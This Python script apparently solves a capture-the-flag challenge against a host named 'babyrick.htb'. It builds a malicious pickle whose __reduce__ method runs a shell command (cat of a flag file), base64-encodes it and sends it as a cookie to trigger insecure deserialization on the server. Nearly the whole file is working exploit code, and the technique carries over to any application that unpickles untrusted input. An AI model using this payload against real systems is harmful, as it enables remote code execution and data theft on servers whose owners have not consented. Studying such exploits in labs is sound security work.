import subprocess
import base64
import cPickle

class Exploit(object):
    def __reduce__(self):
        return subprocess.check_output, (['cat','flag_wIp1b'],)

def serialize_exploit():
    #with open('test.pickle','wb') as f:
    #    _pickle.dump(Exploit(),f,protocol=0)
    shellcode = _pickle.dumps({'serum':Exploit()},protocol=0)
    return shellcode

'''
if __name__ == "__main__":
    #cookie = "KGRwMApTJ3NlcnVtJwpwMQpjY29weV9yZWcKX3JlY29uc3RydWN0b3IKcDIKKGNfX21haW5fXwphbnRpX3BpY2tsZV9zZXJ1bQpwMwpjX19idWlsdGluX18Kb2JqZWN0CnA0Ck50cDUKUnA2CnMu"
    #serialized = base64.b64decode(cookie)
    #anti_pickle_serum = Exploit
    #deserialized = _pickle.loads(serialized)
    #print (deserialized)
    
    plan_b = base64.b64encode(serialize_exploit())
    print (plan_b.decode("utf-8"))

    pass
'''

def get_plan_b():
    shellcode = cPickle.dumps({"serum": Exploit()}, protocol=0)
    #print(shellcode)
    plan_b = base64.b64encode(shellcode)
    return plan_b

import requests
from bs4 import BeautifulSoup

def send():
    session = requests.session()

    burp0_url = "http://babyrick.htb:32238/"
    burp0_cookies = {"plan_b": "%s" % get_plan_b()}
    burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close"}
    burp0_data = {}
    r = session.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)
    
    soup = BeautifulSoup(r.text,features="html.parser")
    print (soup.span)
    pass

send()
